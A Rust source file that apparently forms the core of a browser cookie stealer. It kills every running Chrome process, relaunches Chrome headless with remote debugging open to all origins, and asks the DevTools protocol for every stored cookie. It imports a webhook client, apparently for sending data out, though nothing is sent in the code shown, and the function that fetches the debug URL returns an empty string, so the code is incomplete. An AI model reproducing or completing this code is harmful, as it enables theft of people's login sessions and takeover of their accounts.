use std::process::{Command, Stdio};
use std::{env, fs};
//use decrypt_cookies::{browser::info::ChromiumInfo, Browser, ChromiumBuilder};
use dirs::home_dir;
use dotenv::dotenv;
use serde_json::json;
use serde_json::Value;
use terminal_size::{terminal_size, Height, Width};
use webhook::client::WebhookClient;
use websocket::{ClientBuilder, Message};

const OS: &str = env::consts::OS;
const DEBUG_PORT: u32 = 9222;
const CHROME_PATH: &str = r#"C:\Program Files\Google\Chrome\Application\chrome.exe"#; // Update with your Chrome path
const USER_DATA_DIR: &str = r#"C:\path\to\user\data\dir"#;
#[derive(Debug)]
struct TempCookie {
    host_key: String,
    encypter_value: String,
}

#[tokio::main]
pub async fn main() -> Result<(), reqwest::Error> {
    dotenv().ok();
    kill_chrome();
    start_debugged_chrome();
    let url = get_debug_ws_url().await;
    println!("{}", url);
    let mut client = ClientBuilder::new(&url)
        .unwrap()
        .connect_insecure()
        .unwrap();
    let payload = json!({
        "id": 1,
        "method": "Network.getAllCookies"
    })
    .to_string();
    client.send_message(&Message::text(payload)).unwrap();
    if let Ok(message) = client.recv_message() {
        println!("Received: {:?}", message);
    }
    let _ = client.shutdown();
    kill_chrome();
    Ok(())
}

async fn get_debug_ws_url() -> String {
    let body = reqwest::get(format!("http://localhost:{DEBUG_PORT}/json"))
        .await
        .unwrap()
        .text()
        .await
        .unwrap();
    dbg!("{:?}", body);
    String::new()
}

fn kill_chrome() {
    let output = Command::new("taskkill")
        .args(&["/F", "/IM", "chrome.exe"])
        .output()
        .expect("Failed to execute command");

    if !output.status.success() {
        eprintln!("Failed to kill Chrome: {:?}", output.status);
    }
}

fn start_debugged_chrome() {
    let child = Command::new(CHROME_PATH)
        .args(&[
            &format!("--remote-debugging-port={}", DEBUG_PORT),
            "--remote-allow-origins=*",
            "--headless",
            &format!("--user-data-dir={}", USER_DATA_DIR),
        ])
        .stdout(Stdio::null())
        .stderr(Stdio::null())
        .spawn()
        .expect("Failed to start Chrome");

    println!("Chrome started with PID: {}", child.id());
}
